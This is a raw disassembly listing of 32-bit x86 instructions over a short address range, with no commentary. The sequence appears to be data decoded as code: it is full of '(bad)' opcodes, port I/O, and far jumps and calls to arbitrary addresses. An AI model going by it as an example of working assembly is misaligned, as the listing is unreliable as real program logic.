  41d5a0:	popa   
  41d5a1:	cmp    BYTE PTR [esi+edi*1+0x1f425c68],bl
  41d5a8:	jb     0x41d615
  41d5aa:	out    dx,eax
  41d5ab:	jb     0x41d571
  41d5ad:	hlt    
  41d5ae:	in     al,dx
  41d5af:	sahf   
  41d5b0:	gs or  esi,ebp
  41d5b3:	or     edi,ecx
  41d5b5:	pop    esi
  41d5b6:	add    eax,0x4bcda1f5
  41d5bb:	push   ebx
  41d5bc:	test   BYTE PTR [edi+0x79],bh
  41d5bf:	mov    eax,0xbaa81a1a
  41d5c4:	xchg   esp,eax
  41d5c5:	pop    edi
  41d5c6:	scas   eax,DWORD PTR es:[edi]
  41d5c7:	mov    esi,0x25b2359b
  41d5cc:	ss mov dh,0xf8
  41d5cf:	mov    ch,cl
  41d5d1:	adc    bh,BYTE PTR [esp+eiz*2]
  41d5d4:	jmp    0xa2d7:0xb418ae9c
  41d5db:	into   
  41d5dc:	scas   al,BYTE PTR es:[edi]
  41d5dd:	pop    eax
  41d5de:	in     eax,0x9f
  41d5e0:	mov    ecx,0x508bc80e
  41d5e5:	sbb    eax,0x6c034847
  41d5ea:	(bad)  
  41d5eb:	(bad)  
  41d5ec:	jg     0x41d61a
  41d5ee:	fcmovbe st,st(1)
  41d5f0:	cli    
  41d5f1:	aaa    
  41d5f2:	sahf   
  41d5f3:	icebp  
  41d5f4:	ja     0x41d5d6
  41d5f6:	out    dx,eax
  41d5f7:	mov    al,0x9d
  41d5f9:	xor    DWORD PTR [esi-0x44],ecx
  41d5fc:	push   edx
  41d5fd:	mov    bl,0xa0
  41d5ff:	push   0x5e
  41d601:	cmp    BYTE PTR ds:0x3e8c5622,ch
  41d607:	ds retf 0xec1b
  41d60b:	push   DWORD PTR [edx+ebx*8+0x446f6292]
  41d612:	cmp    al,BYTE PTR [edx-0x15]
  41d615:	pop    edi
  41d616:	dec    ebx
  41d617:	xchg   edi,eax
  41d618:	ins    DWORD PTR es:[edi],dx
  41d619:	es es cdq 
  41d61c:	test   DWORD PTR gs:[edx-0x6ff33991],edi
  41d623:	ins    BYTE PTR es:[edi],dx
  41d624:	xchg   edx,eax
  41d625:	aam    0xa4
  41d627:	mov    eax,ds:0x3d4117df
  41d62c:	dec    edi
  41d62d:	adc    BYTE PTR [eax+0x513dbef],bl
  41d633:	mov    bl,0x4b
  41d635:	fwait
  41d636:	lods   al,BYTE PTR ds:[esi]
  41d637:	dec    edi
  41d638:	add    ebx,DWORD PTR [edi-0x57415bb1]
  41d63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d63f:	data16 stos BYTE PTR es:[edi],al
  41d641:	imul   edi,DWORD PTR [ebp-0x5c7de9b3],0xb28ea289
  41d64b:	xor    ch,BYTE PTR [edi]
  41d64d:	inc    ebx
  41d64e:	add    eax,0x59c8b8d0
  41d653:	fsub   QWORD PTR [ebx-0x70]
  41d656:	lea    esp,[eax+0x2d41e5fb]
  41d65c:	adc    esp,DWORD PTR [ebp+0x62]
  41d65f:	pop    esi
  41d660:	adc    ch,BYTE PTR [edx]
  41d662:	mov    ds,WORD PTR [ecx-0x3]
  41d665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d666:	or     ecx,edi
  41d668:	pushf  
  41d669:	test   al,0x4e
  41d66b:	inc    esp
  41d66c:	jb     0x41d6cf
  41d66e:	int3   
  41d66f:	ins    BYTE PTR es:[edi],dx
  41d670:	enter  0x9901,0x55
  41d674:	xchg   ebp,eax
  41d675:	push   ds
  41d676:	adc    al,0xd1
  41d678:	jmp    0x3bd15398
  41d67d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d67e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d67f:	mov    ecx,0x7f892dcf
  41d684:	div    BYTE PTR [eax+ebp*8]
  41d687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d688:	or     cl,BYTE PTR [ebx+0x2e59aa46]
  41d68e:	and    BYTE PTR [edx-0x3d7caf10],0xf4
  41d695:	pop    edx
  41d696:	inc    edx
  41d697:	repnz mov al,ds:0xb6e0dfb2
  41d69d:	jge    0x41d71e
  41d69f:	pop    ebp
  41d6a0:	pusha  
  41d6a1:	cmp    DWORD PTR [ebx-0x63f968f3],esp
  41d6a7:	mov    eax,0xdf75255d
  41d6ac:	xor    eax,0x12de4452
  41d6b1:	adc    dh,BYTE PTR [esi+0x2c]
  41d6b4:	test   al,0x19
  41d6b6:	inc    ebx
  41d6b7:	setp   BYTE PTR [edx+0x4e123406]
  41d6be:	cmp    al,0xeb
  41d6c0:	in     eax,0xe2
  41d6c2:	push   eax
  41d6c3:	and    al,0x68
  41d6c5:	push   ebx
  41d6c6:	popa   
  41d6c7:	out    dx,eax
  41d6c8:	pop    ss
  41d6c9:	sub    al,BYTE PTR ds:0xca5e8f12
  41d6cf:	stos   DWORD PTR es:[edi],eax
  41d6d0:	nop
  41d6d1:	ret    
  41d6d2:	mov    dl,0x88
  41d6d4:	aam    0x9
  41d6d6:	loop   0x41d6f5
  41d6d8:	popa   
  41d6d9:	adc    eax,DWORD PTR [edi-0x5484ab27]
  41d6df:	mov    cl,0x91
  41d6e1:	lock int3 
  41d6e3:	mov    cl,BYTE PTR [edx+0x239c4064]
  41d6e9:	and    eax,0x26c63709
  41d6ee:	fadd   QWORD PTR [ebp+ecx*2+0x7e]
  41d6f2:	cmp    ah,BYTE PTR fs:[ebp-0x1f]
  41d6f6:	gs pop ebp
  41d6f8:	lods   eax,DWORD PTR ds:[esi]
  41d6f9:	and    esi,esi
  41d6fb:	rol    BYTE PTR [ecx+edx*1-0x75],cl
  41d6ff:	jb     0x41d766
  41d701:	mov    ds:0xe1182722,al
  41d706:	ins    DWORD PTR es:[edi],dx
  41d707:	jb     0x41d68e
  41d709:	dec    edi
  41d70a:	xor    eax,0x43fb3c63
  41d70f:	jl     0x41d75a
  41d711:	mov    al,ch
  41d713:	fcomp  DWORD PTR [esi]
  41d715:	sbb    ah,bl
  41d717:	jnp    0x41d6a5
  41d719:	idiv   BYTE PTR [edi]
  41d71b:	out    0xc3,eax
  41d71d:	mov    edi,DWORD PTR [esi+0x57]
  41d720:	dec    eax
  41d721:	out    0x77,al
  41d723:	arpl   WORD PTR [ebp-0x31a6faf3],sp
  41d729:	dec    eax
  41d72a:	out    dx,al
  41d72b:	lods   eax,DWORD PTR ds:[esi]
  41d72c:	loopne 0x41d771
  41d72e:	in     al,dx
  41d72f:	ret    
  41d730:	stos   BYTE PTR es:[edi],al
  41d731:	gs push ecx
  41d733:	sub    edi,0xfffffffd
  41d736:	jb     0x41d750
  41d738:	test   eax,0xec0bd433
  41d73d:	dec    ebx
  41d73e:	fwait
  41d73f:	inc    edx
  41d740:	dec    esp
  41d741:	mov    edi,0xa2fb4321
  41d746:	nop
  41d747:	push   edi
  41d748:	gs add eax,0x123696c4
  41d74e:	repz push esp
  41d750:	mov    ecx,0x19c08560
  41d755:	cmp    eax,0x8d8aad90
  41d75a:	inc    edx
  41d75b:	xor    eax,0x8184e5f4
  41d760:	mov    al,0xdc
  41d762:	je     0x41d743
  41d764:	enter  0x480f,0x12
  41d768:	jle    0x41d731
  41d76a:	xchg   ecx,eax
  41d76b:	mov    esp,gs
  41d76d:	add    eax,0xe62c7254
  41d773:	clc    
  41d774:	js     0x41d7b0
  41d776:	(bad)  
  41d777:	mov    edi,0xb5d1f86e
  41d77c:	std    
  41d77d:	sti    
  41d77e:	(bad)  
  41d780:	xchg   ebp,ebp
  41d782:	ins    DWORD PTR es:[edi],dx
  41d783:	xchg   ebx,eax
  41d784:	xchg   BYTE PTR [ebp-0x16026415],ah
  41d78a:	adc    eax,0xdc80ddf
  41d78f:	ret    
  41d790:	leave  
  41d791:	(bad)  
  41d792:	xchg   cl,cl
  41d794:	xor    al,0x79
  41d796:	sbb    bl,ah
  41d798:	lods   al,BYTE PTR ds:[esi]
  41d799:	sub    al,0x21
  41d79b:	cmp    dl,BYTE PTR [ebp-0x67]
  41d79e:	in     eax,dx
  41d79f:	mov    eax,ds:0xb5f72c16
  41d7a4:	in     eax,dx
  41d7a5:	iret   
  41d7a6:	pop    es
  41d7a7:	ret    0x380b
  41d7aa:	cdq    
  41d7ab:	int3   
  41d7ac:	sti    
  41d7ad:	add    bh,BYTE PTR [edi+edx*4-0x402bd423]
  41d7b4:	test   al,0xd2
  41d7b6:	mov    ds:0xce05939d,al
  41d7bb:	outs   dx,BYTE PTR ds:[esi]
  41d7bc:	lahf   
  41d7bd:	mov    es,WORD PTR [ebp-0x19]
  41d7c0:	sbb    al,0x93
  41d7c2:	sbb    cl,BYTE PTR [esi]
  41d7c4:	mov    eax,ds:0x4286def7
  41d7c9:	std    
  41d7ca:	mov    dh,0x20
  41d7cc:	lahf   
  41d7cd:	and    esi,DWORD PTR [ebp-0x19e42d4e]
  41d7d3:	js     0x41d831
  41d7d5:	xor    edi,DWORD PTR [edi*2+0x7e7b7186]
  41d7dc:	ja     0x41d817
  41d7de:	dec    ebp
  41d7df:	add    DWORD PTR [edi],ebp
  41d7e1:	xchg   ecx,eax
  41d7e2:	mov    bh,dh
  41d7e4:	or     BYTE PTR [ecx+edx*1+0x4f],dl
  41d7e8:	rcr    BYTE PTR [ecx+edx*8-0x31],cl
  41d7ec:	sti    
  41d7ed:	into   
  41d7ee:	adc    dh,ch
  41d7f0:	scas   eax,DWORD PTR es:[edi]
  41d7f1:	dec    ebp
  41d7f2:	imul   ecx,DWORD PTR [ebx+edi*8],0xf599d4fc
  41d7f9:	aad    0xe4
  41d7fb:	mov    al,ds:0xa06afbb7
  41d800:	jecxz  0x41d880
  41d802:	inc    edx
  41d803:	sbb    esp,DWORD PTR [edx-0x37f7e8aa]
  41d809:	push   0x9048c0dd
  41d80e:	(bad)  
  41d810:	jmp    0x41d877
  41d812:	pop    ss
  41d813:	cmp    dh,BYTE PTR [ebx-0x169cc5c3]
  41d819:	inc    ebx
  41d81a:	mov    cl,0x25
  41d81c:	dec    ecx
  41d81d:	aam    0x2f
  41d81f:	out    dx,al
  41d820:	xlat   BYTE PTR ds:[ebx]
  41d821:	jmp    0x6050897a
  41d826:	cmp    dh,BYTE PTR [ecx+0x342d8be8]
  41d82c:	enter  0xff36,0xf9
  41d830:	call   0x478:0x14f83c92
  41d837:	jmp    0x41d845
  41d839:	sahf   
  41d83a:	sub    eax,0xef4d3727
  41d83f:	test   DWORD PTR [edx-0x57],0x5c32db21
  41d846:	add    esi,edx
  41d848:	dec    ebx
  41d849:	add    bl,BYTE PTR [ecx+0x7f2a1ad7]
  41d84f:	ins    DWORD PTR es:[edi],dx
  41d850:	test   ah,dl
  41d852:	jne    0x41d848
  41d854:	xlat   BYTE PTR ds:[ebx]
  41d855:	lock outs dx,BYTE PTR cs:[esi]
  41d858:	retf   0x5f92
  41d85b:	mov    ah,0x48
  41d85d:	adc    al,0xfa
  41d85f:	mov    bh,0x26
  41d861:	cmc    
  41d862:	dec    esi
  41d863:	sub    esp,DWORD PTR [edi-0x3a]
  41d866:	push   0x2c
  41d868:	hlt    
  41d869:	pop    ebx
  41d86a:	call   0x2e0c:0x151b0b0d
	...
  41da49:	arpl   WORD PTR [esi+0x63ff63be],bx
  41da4f:	call   FWORD PTR [esi-0x676d79db]
  41da55:	jb     0x41da0a
  41da57:	and    BYTE PTR [edx+0x1b71b],bl
  41da5d:	and    BYTE PTR [edi],al
  41da5f:	add    BYTE PTR [eax],al
  41da61:	jg     0x41da8f
  41da63:	or     al,0x1a
  41da65:	push   ss
  41da66:	and    eax,0x2a80326e
  41da6b:	lock std 
  41da6d:	sbb    al,0x2c
  41da6f:	adc    al,0x38
  41da71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da72:	ffree  st(4)
  41da74:	jno    0x41dada
  41da76:	cmc    
  41da77:	add    bh,cl
  41da79:	aaa    
  41da7a:	movnti DWORD PTR [eax+edx*8-0x3f18bde9],edi
  41da82:	outs   dx,BYTE PTR ds:[esi]
  41da83:	test   DWORD PTR [ecx],esp
  41da85:	push   eax
  41da86:	repz hlt 
  41da88:	ret    
  41da89:	call   0xd3d15513
  41da8e:	inc    ecx
  41da8f:	psrad  mm6,QWORD PTR [di-0xa4f]
  41da95:	jne    0x41da1d
  41da97:	jge    0x41dab3
  41da99:	and    edx,0xffffff97
  41da9c:	pusha  
  41da9d:	in     eax,dx
  41da9e:	add    ah,BYTE PTR [esi-0x644cb4b3]
  41daa4:	and    al,0x8b
  41daa6:	cwde   
  41daa7:	and    ebx,DWORD PTR [esp+edi*4+0x40fde477]
  41daae:	fistp  WORD PTR [eax-0x1e62e41e]
  41dab4:	or     dl,cl
  41dab6:	cmp    al,0x57
  41dab8:	cdq    
  41dab9:	push   edx
  41daba:	fadd   QWORD PTR [ecx]
  41dabc:	push   edx
  41dabd:	ins    DWORD PTR es:[edi],dx
  41dabe:	mov    ebx,0x4b88df3e
  41dac3:	and    ebp,DWORD PTR [edx]
  41dac5:	cwde   
  41dac6:	inc    ebx
  41dac7:	fdiv   st,st(3)
  41dac9:	(bad)  
  41daca:	test   cl,bh
  41dacc:	cmp    dl,BYTE PTR [eax-0x62]
  41dacf:	sbb    eax,DWORD PTR cs:[ebp-0x37]
  41dad3:	sti    
  41dad4:	add    DWORD PTR [esi],0xffffffe9
  41dad7:	cmp    eax,DWORD PTR [edx+0x29735ad7]
  41dadd:	mov    bh,0xbd
  41dadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dae0:	jo     0x41db29
  41dae2:	das    
  41dae3:	ds dec esp
  41dae5:	dec    eax
  41dae6:	sub    DWORD PTR [ecx+0x2b065f43],esp
  41daec:	and    eax,0x9c72f5dd
  41daf1:	test   al,0xd3
  41daf3:	sub    ebp,DWORD PTR [ebx+0x52]
  41daf6:	and    DWORD PTR [eax+ebx*1],edi
  41daf9:	pop    eax
  41dafa:	cmp    BYTE PTR [edi+0x22],al
  41dafd:	aad    0x3f
  41daff:	call   0x36ebe718
  41db04:	jb     0x41dac8
  41db06:	jmp    0x41daa1
  41db08:	push   cs
  41db09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0a:	jae    0x41dad4
  41db0c:	mov    ds:0xd62b0812,al
  41db11:	shl    dh,1
  41db13:	and    esp,DWORD PTR [eax-0x195dccb9]
  41db19:	int3   
  41db1a:	mov    ebx,0x33b83f9a
  41db1f:	repz daa 
  41db21:	pop    esp
  41db22:	mov    eax,ds:0xc6e9d641
  41db27:	cmc    
  41db28:	jo     0x41db8c
  41db2a:	mov    al,0xe9
  41db2c:	ds ins DWORD PTR es:[edi],dx
  41db2e:	mov    al,0x9
  41db30:	xchg   ebx,eax
  41db31:	cmp    edi,edx
  41db33:	aas    
  41db34:	cmp    DWORD PTR [esi],esi
  41db36:	lock xchg esp,eax
  41db38:	cli    
  41db39:	in     eax,0xda
  41db3b:	and    al,0x88
  41db3d:	dec    ebx
  41db3e:	pushf  
  41db3f:	shl    DWORD PTR [esi],cl
  41db41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db42:	mov    edx,0x6d172c18
  41db47:	xchg   DWORD PTR [edx-0x1460ee72],ebp
  41db4d:	(bad)  
  41db4e:	jmp    0x41db49
  41db50:	push   eax
  41db51:	mov    esp,0x73f1685e
  41db56:	mov    ss,eax
  41db58:	outs   dx,BYTE PTR ds:[esi]
  41db59:	push   eax
  41db5a:	push   cs
  41db5b:	push   cs
  41db5c:	test   eax,0x29587b5b
  41db61:	jno    0x41daf0
  41db63:	fdivr  DWORD PTR [ecx]
  41db65:	or     eax,0xc51d2c1d
  41db6a:	fisttp QWORD PTR [ebx+0x2d]
  41db6d:	int    0x2b
  41db6f:	mov    eax,ds:0xf267bcc9
  41db74:	(bad)  
  41db75:	addr16 xchg esi,eax
  41db77:	push   0x96abde3c
  41db7c:	addr16 call 0xda02:0xbf06a781
  41db84:	dec    ebx
  41db85:	mov    edx,eax
  41db87:	dec    edi
  41db88:	stos   BYTE PTR es:[edi],al
  41db89:	inc    edx
  41db8a:	out    0x4,eax
  41db8c:	mov    eax,0x55fb8503
  41db91:	adc    al,0x38
  41db93:	dec    edx
  41db94:	pop    bp
  41db96:	pop    ebp
  41db97:	sahf   
  41db98:	add    ah,ch
  41db9a:	or     BYTE PTR [eax-0x33c019d7],bh
  41dba0:	sub    BYTE PTR [eax],bl
  41dba2:	lods   eax,DWORD PTR ds:[esi]
  41dba3:	jle    0x41dc1c
  41dba5:	out    dx,eax
  41dba6:	pop    edx
  41dba7:	ss adc ebp,esp
  41dbaa:	jle    0x41db5a
  41dbac:	push   eax
  41dbad:	aaa    
  41dbae:	sbb    edx,DWORD PTR [ecx+edi*4]
  41dbb1:	cld    
  41dbb2:	cs in  eax,dx
  41dbb4:	repnz mov al,ds:0x13178b88
  41dbba:	add    ah,dl
  41dbbc:	stos   BYTE PTR es:[edi],al
  41dbbd:	loopne 0x41db78
  41dbbf:	das    
  41dbc0:	aaa    
  41dbc1:	sub    DWORD PTR [esi+0x4a096a46],ecx
  41dbc7:	shr    ah,cl
  41dbc9:	push   eax
  41dbca:	fdivrp st(7),st
  41dbcc:	or     al,0x85
  41dbce:	sahf   
  41dbcf:	mov    al,0x47
  41dbd1:	ret    
  41dbd2:	popf   
  41dbd3:	daa    
  41dbd4:	ja     0x41dbbc
  41dbd6:	jne    0x41db7f
  41dbd8:	mov    ah,0x87
  41dbda:	retf   0x767f
  41dbdd:	push   esi
  41dbde:	(bad)  
  41dbdf:	jp     0x41dc43
  41dbe1:	or     al,0x95
  41dbe3:	retf   
  41dbe4:	cmp    al,0xa1
  41dbe6:	or     ecx,DWORD PTR [edx-0x2c151682]
  41dbec:	jl     0x41dc67
  41dbee:	scas   eax,DWORD PTR es:[edi]
  41dbef:	shl    ch,1
  41dbf1:	lods   eax,DWORD PTR ds:[esi]
  41dbf2:	lock jg 0x41dc36
  41dbf5:	xchg   bp,ax
  41dbf7:	mov    ecx,0xa5a38370
  41dbfc:	push   ss
  41dbfd:	sub    ebx,ecx
  41dbff:	sti    
  41dc00:	out    0x87,eax
  41dc02:	and    edx,DWORD PTR [ebp-0x53]
  41dc05:	(bad)  
  41dc06:	xor    al,0xc
  41dc08:	sub    DWORD PTR [ebp+0x6d],esp
  41dc0b:	ret    
  41dc0c:	lock cmp dl,BYTE PTR [ebx-0x695aba5f]
  41dc13:	(bad)  
  41dc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc15:	inc    edi
  41dc16:	xor    DWORD PTR [ecx],edi
  41dc18:	aas    
  41dc19:	ss inc ebp
  41dc1b:	call   0x53c16ce
  41dc20:	loope  0x41dbf2
  41dc22:	int    0xed
  41dc24:	and    BYTE PTR [edi-0x68e89cbe],0x42
  41dc2b:	(bad)  
  41dc2c:	lds    ebx,FWORD PTR [eax-0x566fb479]
  41dc32:	rcl    DWORD PTR [esi+0x88cefb3],cl
  41dc38:	loopne 0x41dc34
  41dc3a:	jmp    0xc2cac8e5
  41dc3f:	inc    edx
  41dc40:	dec    ecx
  41dc41:	mov    BYTE PTR [eax+esi*8-0x461b2b57],dl
  41dc48:	jmp    0x85cf:0x420d1373
  41dc4f:	icebp  
  41dc50:	pop    ecx
  41dc51:	push   esp
  41dc52:	mov    BYTE PTR [esi+ebx*8],al
  41dc55:	add    eax,0x84081754
  41dc5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc5b:	mov    ch,0x25
  41dc5d:	fst    QWORD PTR [eax+0x608fb233]
  41dc63:	cmp    DWORD PTR ds:[eax-0x68a76f28],eax
  41dc6a:	inc    eax
  41dc6b:	mov    WORD PTR [edx+0x1b],fs
  41dc6e:	inc    esp
  41dc6f:	and    ebx,esp
  41dc71:	pusha  
  41dc72:	(bad)  [esi]
  41dc74:	lea    ecx,[ecx]
  41dc76:	out    0xf1,eax
  41dc78:	pushf  
  41dc79:	(bad)  
  41dc7a:	mov    edi,0x7b773d77
  41dc7f:	sbb    eax,0x21b5b40f
  41dc84:	pop    ss
  41dc85:	stc    
  41dc86:	test   al,0xa2
  41dc88:	(bad)  
  41dc89:	aaa    
  41dc8a:	mov    eax,ds:0x3ad8f184
  41dc8f:	shl    BYTE PTR [ecx-0x29],cl
  41dc92:	add    al,0x74
  41dc94:	out    0x88,eax
  41dc96:	push   edi
  41dc97:	add    esp,DWORD PTR [eax-0x5e]
  41dc9a:	sub    al,0x2f
  41dc9c:	(bad)  
  41dc9d:	mov    eax,0xc4e96344
  41dca2:	hlt    
  41dca3:	dec    ecx
  41dca4:	inc    ecx
  41dca5:	and    eax,0x30bbe216
  41dcaa:	stos   BYTE PTR es:[edi],al
  41dcab:	push   0xcd050d2a
  41dcb0:	sbb    DWORD PTR [edx],0xb0a32875
  41dcb6:	push   esp
  41dcb7:	aam    0x1
  41dcb9:	inc    edx
  41dcba:	dec    eax
  41dcbb:	jge    0x41dc8e
  41dcbd:	push   eax
  41dcbe:	ret    
  41dcbf:	mov    ch,0xc6
  41dcc1:	pop    ds
  41dcc2:	fild   QWORD PTR [edx-0x744302cf]
  41dcc8:	cli    
  41dcc9:	fild   WORD PTR ds:0x8db9e671
  41dccf:	call   FWORD PTR [edx]
  41dcd1:	inc    ecx
  41dcd2:	test   esi,esp
  41dcd4:	ins    DWORD PTR es:[edi],dx
  41dcd5:	pop    ecx
  41dcd6:	push   ss
  41dcd7:	arpl   WORD PTR [ecx],bp
  41dcd9:	outs   dx,DWORD PTR ds:[esi]
  41dcda:	adc    al,0x7b
  41dcdc:	out    0xdf,al
  41dcde:	fwait
  41dcdf:	in     eax,0xe
  41dce1:	inc    ebx
  41dce2:	sbb    BYTE PTR [ecx],al
  41dce4:	gs test eax,0xa92beb79
  41dcea:	stos   DWORD PTR es:[edi],eax
  41dceb:	out    0xe1,eax
  41dced:	in     al,dx
  41dcee:	popf   
  41dcef:	push   ecx
  41dcf0:	lods   eax,DWORD PTR ds:[esi]
  41dcf1:	in     eax,dx
  41dcf2:	mov    ds:0xe83e6d52,al
  41dcf7:	scas   al,BYTE PTR es:[edi]
  41dcf8:	cmp    dl,dh
  41dcfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcfb:	dec    edi
  41dcfc:	or     eax,0x1d37d51e
  41dd01:	shr    bl,cl
  41dd03:	xor    eax,0x7356689a
  41dd08:	outs   dx,BYTE PTR ds:[esi]
  41dd09:	jmp    0xb848a2b6
  41dd0e:	cld    
  41dd0f:	pop    es
  41dd10:	mov    ds:0x304db5cc,al
  41dd15:	fs cli 
  41dd17:	xor    ebp,esp
  41dd19:	ret    0xfa47
  41dd1c:	in     al,dx
  41dd1d:	mov    eax,0xcc3f0bbe
  41dd22:	pop    ebp
  41dd23:	lahf   
  41dd24:	mov    ds:0x45f0405f,eax
  41dd29:	jge    0x41dd62
  41dd2b:	adc    esp,DWORD PTR [ebp+0x25]
  41dd2e:	push   0xfffffff5
  41dd30:	mov    ebp,0x118b86de
  41dd35:	dec    edx
  41dd36:	test   BYTE PTR [ecx-0x33],ch
  41dd39:	mov    WORD PTR [ecx],?
  41dd3b:	or     DWORD PTR ds:0x63b7f8fa,ebx
  41dd41:	shl    edi,0x6c
  41dd44:	xor    ch,BYTE PTR [ebp+0x19c2b721]
  41dd4a:	sub    dh,dl
  41dd4c:	repz xchg esp,eax
  41dd4e:	jle    0x41dd38
  41dd50:	imul   ebp,DWORD PTR [edx-0x31634baf],0xfa09624d
  41dd5a:	pushf  
  41dd5b:	push   es
  41dd5c:	iret   
  41dd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd5e:	aas    
  41dd5f:	xchg   ebp,eax
  41dd60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd61:	sbb    eax,0x94fcd6e0
  41dd66:	cmp    edi,ecx
  41dd68:	aad    0x9
  41dd6a:	cwde   
  41dd6b:	pop    ss
  41dd6c:	div    DWORD PTR [edx-0x34f215cd]
  41dd72:	je     0x41dd30
  41dd74:	sub    eax,0x86eb046a
  41dd79:	mov    edi,0x944661e7
  41dd7e:	jl     0x41ddc5
  41dd80:	xchg   esp,eax
  41dd81:	jne    0x41dda9
  41dd83:	dec    ebp
  41dd84:	fnstcw WORD PTR [edx-0x36afb81e]
  41dd8a:	mov    cl,0x6a
  41dd8c:	push   edx
  41dd8d:	dec    eax
  41dd8e:	add    eax,0x8db4a77f
  41dd93:	and    eax,0x9c9d57b7
  41dd98:	out    dx,al
  41dd99:	xor    ebx,DWORD PTR [ecx+0x52183bf0]
  41dd9f:	mov    cl,0x89
  41dda1:	arpl   WORD PTR [ebx-0x7c],bx
  41dda4:	shl    BYTE PTR [esi],1
  41dda6:	jb     0x41dd72
  41dda8:	xchg   ecx,eax
  41dda9:	mov    dh,0xb
  41ddab:	mov    bl,0x80
  41ddad:	pushf  
  41ddae:	scas   al,BYTE PTR es:[edi]
  41ddaf:	ja     0x41dd4c
  41ddb1:	cmp    BYTE PTR [bx+si],dh
  41ddb4:	mov    dh,0x98
  41ddb6:	imul   ebp,ebx,0xcf7bf96a
  41ddbc:	xchg   ebp,eax
  41ddbd:	mov    ds:0x36cc14f7,eax
  41ddc2:	sbb    al,0x4b
  41ddc4:	or     eax,0x7f442807
  41ddc9:	aam    0x9f
  41ddcb:	xlat   BYTE PTR ds:[ebx]
  41ddcc:	fwait
  41ddcd:	or     bl,dh
  41ddcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddd0:	pop    ds
  41ddd1:	ror    DWORD PTR [edi+0x57],0xdb
  41ddd5:	nop
  41ddd6:	or     al,0x91
  41ddd8:	jae    0x41dd69
  41ddda:	int3   
  41dddb:	jno    0x41ddec
  41dddd:	xchg   esp,eax
  41ddde:	arpl   WORD PTR [ecx-0x32],dx
  41dde1:	ja     0x41de0f
  41dde3:	out    dx,eax
  41dde4:	aaa    
  41dde5:	in     al,dx
  41dde6:	idiv   DWORD PTR [esi+0x349cc3c1]
  41ddec:	je     0x41ddc6
  41ddee:	xlat   BYTE PTR ds:[ebx]
  41ddef:	push   ds
  41ddf0:	push   ebx
  41ddf1:	xchg   DWORD PTR ds:0x5f4be74d,esi
  41ddf7:	dec    esi
  41ddf8:	pop    edi
  41ddf9:	out    0xb0,eax
  41ddfb:	xchg   edi,eax
  41ddfc:	repnz mov esi,0x579f662c
  41de02:	aaa    
  41de03:	mov    eax,ds:0x87567dbd
  41de08:	and    BYTE PTR [esi+0x1504a2c2],bh
  41de0e:	mov    edi,0xb5315b2c
  41de13:	in     al,0xf8
  41de15:	mov    ah,al
  41de17:	inc    ebp
  41de18:	sub    BYTE PTR [edi],ah
  41de1a:	inc    ebx
  41de1b:	mov    ch,0x9a
  41de1d:	ins    BYTE PTR es:[edi],dx
  41de1e:	add    BYTE PTR [esi],0xee
  41de21:	aaa    
  41de22:	test   BYTE PTR [eax-0x70],ch
  41de25:	je     0x41de12
  41de27:	lahf   
  41de28:	fild   DWORD PTR [esi]
  41de2a:	lods   eax,DWORD PTR ds:[esi]
  41de2b:	test   BYTE PTR [ebp-0x2f13f8d5],bh
  41de31:	jno    0x41de3d
  41de33:	sbb    al,BYTE PTR [edx]
  41de35:	jp     0x41de5e
  41de37:	dec    edi
  41de38:	vpmuludq xmm1,xmm7,XMMWORD PTR [esi+0x3a2d5573]
  41de40:	jnp    0x41de95
  41de42:	addr16 or ah,ah
  41de45:	mov    ah,0xc2
  41de47:	cwde   
  41de48:	xor    BYTE PTR [eax],bl
  41de4a:	push   ss
  41de4b:	push   ecx
  41de4c:	(bad)  
  41de4d:	popf   
  41de4e:	jns    0x41de9f
  41de50:	pop    eax
  41de51:	rcl    BYTE PTR [edx-0x65270696],0x6
  41de58:	cmp    dh,dl
  41de5a:	out    dx,eax
  41de5b:	add    ah,cl
  41de5d:	in     al,0xe0
  41de5f:	sbb    dl,BYTE PTR [edi]
  41de61:	shl    BYTE PTR [edi],cl
  41de63:	jle    0x41de66
  41de65:	rol    BYTE PTR [eax],0xa0
  41de68:	ja     0x41dee0
  41de6a:	jl     0x41de77
  41de6c:	lods   eax,DWORD PTR ds:[esi]
  41de6d:	push   esp
  41de6e:	mov    ebp,DWORD PTR fs:[eax+0x45]
  41de72:	rol    DWORD PTR [ebp+edi*1-0x7a],1
  41de76:	inc    ebx
  41de77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de78:	je     0x41de5a
  41de7a:	jae    0x41de87
  41de7c:	test   eax,0x33746053
  41de81:	lahf   
  41de82:	loop   0x41de9f
  41de84:	sbb    ah,dh
  41de86:	push   eax
  41de87:	adc    eax,0xfb26f7d9
  41de8c:	mov    eax,ds:0xea593d3e
  41de91:	inc    ebp
  41de92:	inc    esp
  41de93:	push   ebx
  41de94:	xchg   BYTE PTR [ebp+0x2f0d01d1],al
  41de9a:	not    BYTE PTR [ebx+0x7f201008]
  41dea0:	mov    ah,0x10
  41dea2:	pop    esp
  41dea3:	mov    ebx,0x229c42ea
  41dea8:	xlat   BYTE PTR ds:[ebx]
  41dea9:	mov    ah,0x65
  41deab:	mov    ds:0xcb7f6e0a,eax
  41deb0:	das    
  41deb1:	in     eax,0x34
  41deb3:	rol    DWORD PTR [esi+0x6f],cl
  41deb6:	fadd   DWORD PTR [edx]
  41deb8:	sub    BYTE PTR [edi+0x2a6e7ba8],cl
  41debe:	push   ss
  41debf:	mov    esi,0xfa5265a9
  41dec4:	imul   edx,DWORD PTR [edi+0x3d856de2],0xffffffbe
  41decb:	lock call 0x7a89ce64
  41ded1:	sbb    eax,0xe1a526c9
  41ded6:	je     0x41df17
  41ded8:	xchg   edx,eax
  41ded9:	mov    edx,0x9e0aa117
  41dede:	das    
